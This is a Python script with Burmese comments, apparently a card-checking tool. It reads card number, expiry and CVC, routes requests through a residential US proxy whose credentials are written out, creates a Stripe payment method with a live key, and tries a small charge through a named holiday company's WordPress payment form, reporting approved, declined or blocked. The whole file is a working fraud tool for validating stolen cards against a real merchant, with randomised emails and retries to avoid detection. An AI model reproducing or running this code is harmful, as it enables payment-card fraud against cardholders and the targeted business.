import requests, re
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ==========================================
# 👇 PROXY SETTINGS (US Virginia Beach 🇺🇸 + Auto Retry)
# ==========================================
PROXY_HOST = 'geo.g-w.info'
PROXY_PORT = '10080'

# 🔥 မင်းထုတ်လာတဲ့ US Proxy (Virginia Beach) ကို ထည့်လိုက်ပြီ
PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-xg0gkepv-country-US-city-Virginia_Beach-rotation-15'

PROXY_PASS = 'EJJT0uWaSUv4yUXJ'
# ==========================================

# Proxy String တည်ဆောက်ခြင်း
proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {
    'http': proxy_url,
    'https': proxy_url
}

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        if "20" in yy:
            yy = yy.split("20")[1]

        letters = string.ascii_lowercase + string.digits
        random_name = ''.join(random.choice(letters) for i in range(10))
        random_email = f"{random_name}@gmail.com"

        # 🔥 RETRY SYSTEM (အရေးကြီးဆုံး အပိုင်း) 🔥
        # Proxy တခါချိတ်မရရင် ၃ ခါအထိ ပြန်စမ်းမယ် (Slow Proxy Error ပျောက်အောင်)
        session = requests.Session()
        retry = Retry(connect=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.proxies = proxies

        # ==========================================
        # Step 1: Create Payment Method (Stripe)
        # ==========================================
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        }

        data = (
            f'type=card&card[number]={n}&card[cvc]={cvc}'
            f'&card[exp_month]={mm}&card[exp_year]={yy}'
            f'&guid=NA&muid=NA&sid=NA'
            f'&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element'
            f'&key=pk_live_51QhDDVHWPpZcisLuMwjv1ViU8uCO57CpVHEkbM1kqmtEjJeIqjpaWdkV1v1aJIZzTsfQrSwP87AbhnkJLjXzF3yS00YCnP2Wym'
        )

        # session.post ကိုသုံးထားတယ် (Retry အလုပ်လုပ်အောင်)
        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            timeout=40 
        )

        if 'id' not in response.json():
            return "Proxy Error (PM Failed) ❌"
            
        pm = response.json()['id']

        # ==========================================
        # Step 2: Charge Request (Benidorm Holidays)
        # ==========================================
        headers = {
            'authority': 'www.benidormholidays.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.benidormholidays.com',
            'referer': 'https://www.benidormholidays.com/payments/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wp_full_stripe_inline_payment_charge',
            'wpfs-form-name': 'MakeAPayment',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount-unique': '5',
            'wpfs-custom-input[]': 'Super ',
            'wpfs-card-holder-email': random_email,
            'wpfs-card-holder-name': 'Super Z',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }

        response = session.post(
            'https://www.benidormholidays.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            timeout=40
        )
        
        try:
            result = response.json()['message']
        except:
            if "Cloudflare" in response.text or response.status_code == 403:
                result = "IP Blocked by Site ❌"
            else:
                result = "Decline⛔"

    except Exception as e:
        # ၃ ခါလုံး Retry လုပ်လို့မှ မရရင်တော့ တကယ် Error ပါ
        result = f"Connection Failed (Retry Limit) ⚠️"
        
    return result
